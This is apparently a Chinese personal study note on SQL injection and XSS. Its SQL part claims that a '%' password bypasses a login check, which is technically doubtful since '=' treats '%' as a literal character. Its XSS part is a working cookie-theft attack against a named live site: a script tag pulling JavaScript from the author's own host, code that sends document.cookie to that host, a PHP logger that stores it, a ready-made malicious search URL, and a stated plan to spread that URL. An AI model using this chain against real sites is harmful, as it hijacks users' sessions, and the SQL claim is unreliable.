# SQL注入

老生常谈，在登陆框使用通配符，后端没进行输入检测直接带进查询语句中永远都会返回真值。

```sql
select * from user where name='乱输入的东西' and passwd='%';
#这条语句永远返回真true
```

从而绕过登陆鉴权环节。

但是当今的web服务基本上都会进行输入检测，而且密码不是直接明文存储在数据库中。

| name    | passwd           | salt   |
| ------- | ---------------- | ------ |
| liuting | md5(明文密码 + salt) | string |

密码的校验一般是

```sql
select * from user where name='乱输入的东西' and passwd=MD5("%" + salt);
#可以看到，此时即使没有进行输入检测，%也无法形成通配绕过登陆
```

为什么要使用一个salt？ 

为了防止彩虹库撞击，黑客可能会有泄露的一大堆数据库账户密码，然后不断的一个个使用MD5哈希得到的值进行撞库，然而加入了用户级别的salt后，单纯的撞库无法破解。

# XSS注入/攻击

简单一点讲，就是前端（如果动态网页由前端渲染）或者后端（网页由后端渲染，比如php）没有对用户表单（论坛评论，搜索框等）进行检测，那么就会形成xss漏洞，黑客可以利用这个漏洞篡改你动态渲染出来的html网页。

xss注入实例（我终于也当了一回黑客..)

http://www.zghpw.com/

上面这个网页就存在xss漏洞，在搜索框嵌入js语句

```js
<script>alert(1);</script>
```

会反馈在请求回来的html页面中

![](/Users/liuting/Library/Application%20Support/marktext/images/2023-04-12-19-59-33-image.png)

因为后端php对网页进行渲染的时候没有检测用户输入合法性，把脚本嵌进了返回的html中

![](/Users/liuting/Library/Application%20Support/marktext/images/2023-04-12-20-00-45-image.png)

如果嵌入的是访问我的个人js文件，例如

```js
<script src="http://saintcoder.duapp.com/joke/joke.js"></script>
```

而js文件长这样, 功能是向我的（黑客的）后端web服务器发送cookie信息

```js
var img = document.createElement('img');
img.width = 0;
img.height = 0;
img.src = 'http://saintcoder.duapp.com/joke/joke.php?joke='+encodeURIComponent(document.cookie);
```

那么，我在有漏洞的这个网站上的所有cookie信息便被黑客截获。

```php
<?php
    @ini_set('display_errors',1);
    $str = $_GET['joke'];
    $filePath = "joke.php";

    if(is_writable($filePath)==false){
         echo "can't write";
    }else{
          $handler = fopen(filePath, "a");
          fwrite($handler, $str);
          fclose($handler);
    }
?>
```

我所要做的便是把这行嵌入js脚本的搜索语句到处散播，就可以截获大量该网站用户的cookie

```url
http://www.z.zghpw.cn/tosearch.do?page=0&world=%3Cscript%20src=%22http://saintcoder.duapp.com/joke/joke.js%22%3E%3C/script%3E
```

或者，我在论坛评论区这种大家都要加载评论信息的地方嵌入破坏网页的js脚本，那么只要看到这条评论的人都会显示错误的网页。
